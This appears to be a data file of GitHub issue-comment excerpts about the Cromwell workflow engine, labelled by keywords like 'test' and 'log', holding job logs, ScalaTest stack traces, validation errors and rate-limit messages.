15:09:10,76] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: echo 'Hello World!' > ""helloWorld.txt""; [2018-11-21 15:09:10,80] [info] Submitting job to AWS Batch; [2018-11-21 15:09:10,80] [info] dockerImage: ubuntu:latest; [2018-11-21 15:09:10,80] [info] jobQueueArn: arn:aws:batch:us-east-1:267795504649:job-queue/GenomicsHighPriorityQue-ae4256f76f07d96; [2018-11-21 15:09:10,80] [info] taskId: test.hello-None-1; [2018-11-21 15:09:10,80] [info] hostpath root: test/hello/02306258-436a-4372-ab54-2dcd83c42b47/None/1; [2018-11-21 15:09:14,56] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: job id: 77106e8d-c518-4c0d-82e9-3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:2707,test,test,2707,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['test'],['test']
Testability,12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:410); at scala.collection.immutable.List.foreach(List.scala:389); a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:6643,Test,TestSuite,6643,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['Test'],['TestSuite']
Testability,12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:410); at scala.collection.immutable.List.foreach(List.scala:389); a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:6649,Test,TestSuite,6649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,1,['Test'],['TestSuite']
Testability,"1206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl; [2018-11-09 10:25:30,04] [error] WorkflowManagerActor Workflow ec689f2a-c5a8-4c3a-9356-531b3cf0f2da failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; running cwltool on file /tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl failed with Traceback (most recent call last):; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/heterodon/__init__.py"", line 24, in apply; File ""<string>"", line 1, in <module>; File ""<string>"", line 12, in cwltool_salad; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/cwltool/load_tool.py"", line 279, in validate_document; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 915, in resolve_all; File ""/home/dyuen/test/dockstore-workflow-md5sum-unified/cromwell-36.jar/Lib/schema_salad/ref_resolver.py"", line 1087, in validate_links; schema_salad.validate.ValidationException: ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:24:1: checking field steps; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:30:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#checker; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:31:5: Field run contains undefined reference to file:///tmp/cwl_temp_dir_2148913290991206234/checker/md5sum_checker.cwl; ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl:25:3: checking object ../../../../tmp/cwl_temp_dir_2148913290991206234/cwl_temp_file_ec689f2a-c5a8-4c3a-9356-531b3cf0f2da.cwl#md5sum; ../.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477:3286,test,test,3286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4366#issuecomment-437395477,1,['test'],['test']
Testability,"186424Z"",; ""startTime"": ""2018-04-03T21:35:09Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.588Z"",; ""description"": ""Pending"",; ""endTime"": ""2018-04-03T21:35:02.588Z""; },; {; ""startTime"": ""2018-04-03T21:35:48.818896012Z"",; ""description"": ""pulling-image"",; ""endTime"": ""2018-04-03T21:37:50.448425714Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.588Z"",; ""description"": ""WaitingForValueStore"",; ""endTime"": ""2018-04-03T21:35:02.588Z""; },; {; ""startTime"": ""2018-04-03T21:37:50.448425714Z"",; ""description"": ""localizing-files"",; ""endTime"": ""2018-04-03T21:52:07.621362223Z""; },; {; ""startTime"": ""2018-04-03T21:35:02.588Z"",; ""description"": ""RequestingExecutionToken"",; ""endTime"": ""2018-04-03T21:35:02.588Z""; },; {; ""startTime"": ""2018-04-04T00:10:30.287776787Z"",; ""description"": ""cromwell poll interval"",; ""endTime"": ""2018-04-04T00:13:04.837Z""; }; ],; ""backendLogs"": {; ""log"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/PreSort.log""; },; ""start"": ""2018-04-03T21:35:02.588Z""; }; ]; },; ""outputs"": {; ""MarkDuplicates.ClassicMarkDuplicates.outputMetrics"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates/md.metrics"",; ""MarkDuplicates.SortSam.outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-SortSam/md.sorted.bam"",; ""MarkDuplicates.ClassicMarkDuplicates.outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates/md.bam"",; ""MarkDuplicates.PreSort.outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/md.sorted.bam""; },; ""workflowRoot"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/"",; ""id"": ""01c7d76f-5b2b-48cd-be08-ce75b923666e"",; ""inputs"": {; ""MarkDuplicates.inBam"": ""gs://broad-public-datasets/NA12878/NA1287",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:11011,log,log,11011,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['log'],['log']
Testability,"2-ab54-2dcd83c42b47/None/1; [2018-11-21 15:09:14,56] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: job id: 77106e8d-c518-4c0d-82e9-3f23e1f07040; [2018-11-21 15:09:14,62] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37] [info] WorkflowManagerActor WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47 is in a terminal state: WorkflowSucceededState; [2018-11-21 15:09:43,77] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; },; ""id"": ""02306258-436a-4372-ab54-2dcd83c42b47""; }; [2018-11-21 15:09:44,59] [info] Workflow polling stopped; [2018-11-21 15:09:44,60] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] Aborting all running workflows.; [2018-11-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-11-21 15:09:44,62] [info] WorkflowLogCopyRouter stopped; [2018-11-21 15:09:44,62] [info] JobExecutionTokenDispenser stopped; [2018-11-21 15:09:44,62] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor All workflows finished; [2018-11-21 15:09:44,62] [info] Wor",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:4389,test,test,4389,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['test'],['test']
Testability,"2022 1:23:57 PM liquibase.lockservice |; | cromwell | stdout | INFO | INFO: Successfully acquired change log lock |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Creating database history table with name: cromwell_test.DATABASECHANGELOG |; | cromwell | stdout | INFO | Jul 22, 2022 1:23:59 PM liquibase.changelog |; | cromwell | stdout | INFO | INFO: Reading from cromwell_test.DATABASECHANGELOG |; | centaur | slf4j | INFO | 13:24:00.375 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 13:24:00.376 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | Jul 22, 2022 1:24:00 PM liquibase.changelog |; | cromwell | stdout | WARN | WARNING: modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. From the [logs for this current PR](https://app.travis-ci.com/github/broadinstitute/cromwell/jobs/577574057):. | Application | Logger | Level | Message |; |---|-------|---|---|; | cromwell | slf4j | INFO | 2022-07-23 22:04:49 main INFO - Running with database db.url = jdbc:mysql://localhost:3306/cromwell_test?allowPublicKeyRetrieval=true&useSSL=false&rewriteBatchedStatements=true&serverTimezone=UTC&useInformationSchema=true |; | centaur | slf4j | INFO | 22:04:54.033 [ScalaTest-main] INFO centaur.CromwellManager$ - Cromwell server alive while waiting = false |; | centaur | slf4j | INFO | 22:04:54.034 [ScalaTest-main] INFO centaur.CromwellManager$ - Waiting for Cromwell... |; | cromwell | stdout | WARN | 2022-07-23 22:04:54 db-1 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case |. Differences:; - Liquibase calls to java.util.logging are now being routed to slf4j, including identifying the thread `db-1`.; - Liquib",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532:1569,log,logs,1569,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6813#issuecomment-1193214532,1,['log'],['logs']
Testability,208); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.org$scalatest$FlatSpecLike$$super$run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.FlatSpecLike.$anonfun$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); a,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:4581,Test,TestFramework,4581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,2,['Test'],['TestFramework']
Testability,210); at org.scalatest.BeforeAndAfterAll.run$(BeforeAndAfterAll.scala:208); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.org$scalatest$FlatSpecLike$$super$run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.FlatSpecLike.$anonfun$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.jav,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:4515,Test,TestFramework,4515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,4,['Test'],['TestFramework']
Testability,"2467800@1088569555438'."",; ""reason"" : ""rateLimitExceeded""; } ],; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""status"" : ""RESOURCE_EXHAUSTED""; }; 2016-12-08 16:14:28,581 cromwell-system-akka.dispatchers.engine-dispatcher-145 INFO - WorkflowExecutionActor-0545f731-803b-4194-a74e-44cc5c208ce4 [UUID(0545f731)]: Retrying job execution for PairedEndSingleSampleWorkflow.SamToFastqAndBwaMem:5:2; 2016-12-08 16:14:28,585 cromwell-system-akka.dispatchers.engine-dispatcher-145 INFO - WorkflowExecutionActor-0545f731-803b-4194-a74e-44cc5c208ce4 [UUID(0545f731)]: Starting calls: PairedEndSingleSampleWorkflow.SamToFastqAndBwaMem:5:2; ```. and this is one that was not pre-emptible(is my guess based on metadata from the workflow, only one task is ""failed"" in that workflow); ```; 2016-12-08 16:14:36,602 cromwell-system-akka.dispatchers.engine-dispatcher-289 ERROR - WorkflowManagerActor Workflow 0545f731-803b-4194-a74e-44cc5c208ce4 failed (during ExecutingWorkflowState): cromwell.core.package$CromwellFatalException: cromwell.core.package$CromwellFatalException: com.google.api.client.googleapis.json.GoogleJsonResponseException: 429 Too Many Requests; {; ""code"" : 429,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""reason"" : ""rateLimitExceeded""; } ],; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""status"" : ""RESOURCE_EXHAUSTED""; }; 2016-12-08 16:14:36,604 cromwell-system-akka.dispatchers.engine-dispatcher-89 INFO - WorkflowManagerActor WorkflowActor-0545f731-803b-4194-a74e-44cc5c208ce4 is in a terminal state: WorkflowFailedState; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-271640490:2204,sandbox,sandbox,2204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-271640490,2,['sandbox'],['sandbox']
Testability,2667. ```; org.scalatest.exceptions.TestFailedDueToTimeoutException: The code passed to eventually never returned normally. Attempted 210 times over 3.3447279390999998 minutes. Last failure message: Submitted did not equal Failed.; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:36,Test,TestFailedDueToTimeoutException,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['Test'],['TestFailedDueToTimeoutException']
Testability,"28Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt""; startTime: '2017-01-13T23:04:22.693611455Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt_summary.html""; startTime: '2017-01-13T23:08:18.577755879Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task-rc.txt""; startTime: '2017-01-13T23:12:21.761179493Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt""; startTime: '2017-01-13T23:16:37.083751898Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt""; startTime: '2017-01-13T23:20:40.785907191Z'; labels: {}; projectId: broad-firecloud-benchmark; request:; '@type': type.googleapis.com/google.genomics.v1alpha2.RunPipelineRequest; ephemeralPipeline:; docker:; cmd: /bin/bash /cromwell_root/exec.sh; imageName: broadinstitute/broadmutationcalling_beta:benchmark_1; inputParameters:; - name: __extra_config_gcs_path; - localCopy:; disk: local-disk; path: fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localC",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:1889,log,log,1889,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['log'],['log']
Testability,"3 16:51:01,890 cromwell-system-akka.dispatchers.backend-dispatcher-114 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Initializing to Running; Feb 13 11:51:09 gce-cromwell-alpha102 docker/cromwell-proxy[837]: 10.255.12.12 - 115823398202479362549 [13/Feb/2017:11:51:09 -0500] ""GET /api/workflows/v1/3d01da76-98f9-4751-a3c0-efc61ef67030/status HTTP/1.1"" 200 73 ""-"" ""spray-can/1.3.2""; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:38,243 cromwell-system-akka.dispatchers.backend-dispatcher-101 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:38,977 cromwell-system-akka.dispatchers.engine-dispatcher-57 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; Feb 13 11:51:38 gce-cromwell-alpha102 docker/cromwell-app[837]: ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.engine-dispatcher-67 INFO - WorkflowManagerActor WorkflowActor-3d01da76-98f9-4751-a3c0-efc61ef67030 is in a terminal state: WorkflowSucceededState; Feb 13 11:51:39 gce-cromwell-alpha102 docker/cromwell-app[837]: 2017-02-13 16:51:39,178 cromwell-system-akka.dispatchers.io-dispatcher-10 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log to 